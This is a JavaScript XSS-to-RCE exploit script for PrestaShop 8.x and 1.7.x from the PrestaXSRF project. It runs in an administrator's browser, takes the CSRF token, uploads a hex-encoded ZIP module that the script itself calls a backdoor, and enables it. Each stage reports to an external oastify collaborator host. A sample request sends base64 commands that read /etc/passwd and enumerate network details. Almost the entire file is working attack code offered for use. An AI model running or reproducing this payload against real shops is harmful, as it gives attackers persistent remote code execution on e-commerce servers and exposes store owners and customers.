/*
                                *

                         *  _|_
                         .-' * '-. *
                        /       * \
                     *  ^^^^^|^^^^^     (https://github.com/nowak0x01/PrestaXSRF)
                         .~. |  .~.              @Author: Hudson Nowak
                        / ^ \| / ^ \
                       (|   |J/|   |)
                       '\   /`"\   /`
             -- '' -'-'  ^`^    ^`^  -- '' -'-'

*/

// ************************************ ~% Variables %~ ************************************ //

var Target = "http://localhost/"; // Ex: https://checkout.example.com/
var Callback = "https://zwzozssa5whlpvfnfd9fko1klbr2fy3n.oastify.com/"; // Ex: https://collaborator.oastify.com/ (optional) (only if you want to receive feedback at each stage).

// ************************************ ~% Functions %~ ************************************ //

PSUploadModule(); // (RCE) - Upload a Persistent Module (backdoor) to PrestaShop.

// PrestaShop 8.X.X and 1.7.X.X
function PSUploadModule() {

    // The Contents of your .zip module file encoded in Hex. (only change it if you are going to use another template than PrestaShop Analytics) -> Ex: xxd -p -c 0 [Module.zip].
    var HexFileContent = "504b03040a0000000000bda59a570000000000000000000000000a001c00616e616c79746963732f5554090003853b8b658a3b8b6575780b000104e803000004e8030000504b03040a000000000077b198577bb6117b120000001200000013001c00616e616c79746963732f696e6465782e7068705554090003a1ac8865aaac886575780b000104e803000004e80300003c3f7068700a09706870696e666f28293b0a504b030414000000080066b49857533fd85699010000d303000017001c00616e616c79746963732f616e616c79746963732e706870555409000320b288654f3b8b6575780b000104e803000004e80300008593514bc3301485dff32ba20c9b3e2813e694cd2982823ee886135f44429adcd8609794241545f6df4db7aeebec74792acd77ee39f7d09e5fe6698e909298ec09904a8320119d4ce9f3cde3f46efc40a338c6df0887039fca0fd11c219e31e7f09566d99757dc850b0f5a387c6f4491015ad27991648a635968ee95d198526eb4f3b6e09ec40b62c995a7e353e50e2f349b011ee188ad2647c3df88674949486bb4a7464ac5814a60beb0b085fe00eb4aefa0383bea1d9db60956f8d4d8129884099e4d5393b7290d20a80ae999e665c2ee10d548ce2c683f186cecd7b8af4608e5f28c7d3d2c57ac5e66a461bb2e348a5b0904386e55ee97dbace52b748eb696bec89c65adc22d84c6749dbdc6f0c141cd34dc2dbc29e7c1de1af34ea26a955b33831df685de11a0fbaf3c0d76d76b33d20979d9ccb5be1e1e1c12c6df43330973d0ef5101dc8820a093f1f4e9253a81e393fe59f4daecb504fe14c8e4b4dbebf20d85924439079ed47e655d0df7bd11dedf8f1bc12a5523df2820e17f535a9a40564fa46132df661792555665e6caa69e5a01ab26e7e807504b03040a000000000031b3985700000000000000000000000010001c00616e616c79746963732f76696577732f5554090003ddaf8865633b8b6575780b000104e803000004e8030000504b03040a000000000031b398570000000000000000000000001a001c00616e616c79746963732f76696577732f74656d706c617465732f5554090003ddaf8865653b8b6575780b000104e803000004e8030000504b03040a000000000031b398570000000000000000000000001f001c00616e616c79746963732f76696577732f74656d706c617465732f686f6f6b2f5554090003ddaf8865673b8b6575780b000104e803000004e8030000504b030414000000080031b39857267635cb45000000460000002e001c00616e616c79746963732f76696577732f74656d706c617465732f686f6f6b2f646973706c6179486f6d652e74706c5554090003ddaf8865673b8b6575780b000104e803000004e8030000abd6d2e2d2527048cbcc4955c8cd4f29cd492dd64fcc4bcca92cc94c2ed62fcb4c2d2fd62f49cd2dc8492c01ca64e4e767eba7641603b9951ef9b9a97a2505395c5ab55c00504b01021e030a0000000000bda59a570000000000000000000000000a0018000000000000001000ed4100000000616e616c79746963732f5554050003853b8b6575780b000104e803000004e8030000504b01021e030a000000000077b198577bb6117b1200000012000000130018000000000001000000a48144000000616e616c79746963732f696e6465782e7068705554050003a1ac886575780b000104e803000004e8030000504b01021e0314000000080066b49857533fd85699010000d3030000170018000000000001000000a481a3000000616e616c79746963732f616e616c79746963732e706870555405000320b2886575780b000104e803000004e8030000504b01021e030a000000000031b39857000000000000000000000000100018000000000000001000ed418d020000616e616c79746963732f76696577732f5554050003ddaf886575780b000104e803000004e8030000504b01021e030a000000000031b398570000000000000000000000001a0018000000000000001000ed41d7020000616e616c79746963732f76696577732f74656d706c617465732f5554050003ddaf886575780b000104e803000004e8030000504b01021e030a000000000031b398570000000000000000000000001f0018000000000000001000ed412b030000616e616c79746963732f76696577732f74656d706c617465732f686f6f6b2f5554050003ddaf886575780b000104e803000004e8030000504b01021e0314000000080031b39857267635cb45000000460000002e0018000000000001000000a48184030000616e616c79746963732f76696577732f74656d706c617465732f686f6f6b2f646973706c6179486f6d652e74706c5554050003ddaf886575780b000104e803000004e8030000504b0506000000000700070095020000310400000000";
    var Filename = "analytics.zip";
    var admin_endpoint = "administration"; // administrator endpoint

    if (Target.substr(-1) != '/') Target += '/';
    var _stage1 = new XMLHttpRequest();
    _stage1.open("GET", Target + admin_endpoint + "/index.php", false);
    _stage1.send();

    if (_stage1.responseText) {

        // Verify if the User have access to Admin Panel
        if (_stage1.responseURL.match("AdminLogin")) {

            if (Callback) {
                var _callback = new XMLHttpRequest();
                _callback.open("POST", Callback, true);
                _callback.send(
                    JSON.stringify(
                        {
                            "Host": Target + admin_endpoint + "/index.php",
                            "Module": "PSUploadModule()",
                            "Message": "ERROR: Stage 1 - (The user affected by XSS lacks access to the Admin Panel)",
                            "Redirect URI": _stage1.responseURL,
                            "Date": new Date().toUTCString()
                        }
                    )
                );
            }

        } else {

            // Upload Module
            var blob = hexToBlob(HexFileContent);
            var boundary = "--nowak0x01";
            var formData = new FormData();
            formData.append('file_uploaded', new Blob([blob], { type: "application/zip" }), Filename);

            function hexToBlob(hexString) {
                const arrayBuffer = new Uint8Array(hexString.match(/.{1,2}/g).map(byte => parseInt(byte, 16))).buffer;
                return new Blob([arrayBuffer], { type: 'application/zip' });
            }

            // Extract CSRF Token
            var _regx = new RegExp(`\\/${admin_endpoint}\\/index\\.php\\/improve\\/modules\\/manage\\?_token=([^&"]+)`);
            var _token = _stage1.responseText.match(_regx)[1];
            var _stage2 = new XMLHttpRequest();
            _stage2.open("POST", Target + admin_endpoint + "/index.php/improve/modules/import?_token=" + _token, false);
            _stage2.send(formData);

            if (_stage2.responseText.match("Installation of module")) {

                if (Callback) {
                    var _callback = new XMLHttpRequest();
                    _callback.open("POST", Callback, true);
                    _callback.send(
                        JSON.stringify(
                            {
                                "Host": Target + admin_endpoint + "/index.php/improve/modules/import?_token=" + _token,
                                "Module": "PSUploadModule()",
                                "Message": "[Sucessful] Stage 2 - The module " + Filename + " has been uploaded!",
                                "Date": new Date().toUTCString()
                            }
                        )
                    );
                }

                var _stage3 = new XMLHttpRequest();
                _stage3.open("POST", Target + admin_endpoint + "/index.php/improve/modules/manage/action/enable/analytics?_token=" + _token, false);
                _stage3.send();

                if (_stage3.responseText.match("Enable action on module")) {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + admin_endpoint + "/index.php/improve/modules/manage/action/enable/analytics?_token=" + _token,
                                    "Module": "PSUploadModule()",
                                    "Message": "[Sucessful] Stage 3 - The module " + Filename + " has been enabled!",
                                    "About": [
                                        "If you're utilizing the default PrestaShop Analytics module included in the exploit, you can access the backdoor on the home page '/' .",
                                        "To see examples, check: https://github.com/nowak0x01/PrestaXSFR",
                                        "",
                                        "# HTTP Request Example #",
                                        "POST / HTTP/2",
                                        "Host: localhost",
                                        "Content-Type: application/x-www-form-urlencoded",
                                        "[\r\n]",
                                        "5e1568=c3lzdGVt&fb7040c=ZGF0ZTtpZDtscyAtYWxoO2lmY29uZmlnO2lwIGE7Y2F0IC9ldGMvaG9zdHM7Y2F0IC9ldGMvKnJlbGVhc2U7Y2F0IC9ldGMvcGFzc3dkO3NzIC1ubHB0dTsgbmV0c3RhdCAtbmxwdHU=",
                                        ""
                                    ],
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }

                } else {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + admin_endpoint + "/index.php/improve/modules/manage/action/enable/analytics?_token=" + _token,
                                    "Module": "PSUploadModule()",
                                    "Date": new Date().toUTCString(),
                                    "Message": "[UNKNOWN ERROR] Stage 3 - Cannot Enable the Module: " + Filename,
                                    "About": encodeURIComponent(_stage3.responseText)
                                }
                            )
                        );
                    }

                }

            } else {

                if (Callback) {
                    var _callback = new XMLHttpRequest();
                    _callback.open("POST", Callback, true);
                    _callback.send(
                        JSON.stringify(
                            {
                                "Host": Target + admin_endpoint + "/index.php/improve/modules/import?_token=" + _token,
                                "Module": "PSUploadModule()",
                                "Date": new Date().toUTCString(),
                                "Message": "[UNKNOWN ERROR] Stage 2 - Cannot Install the Module: " + Filename,
                                "About": encodeURIComponent(_stage2.responseText)
                            }
                        )
                    );
                }
            }
        }
    }
}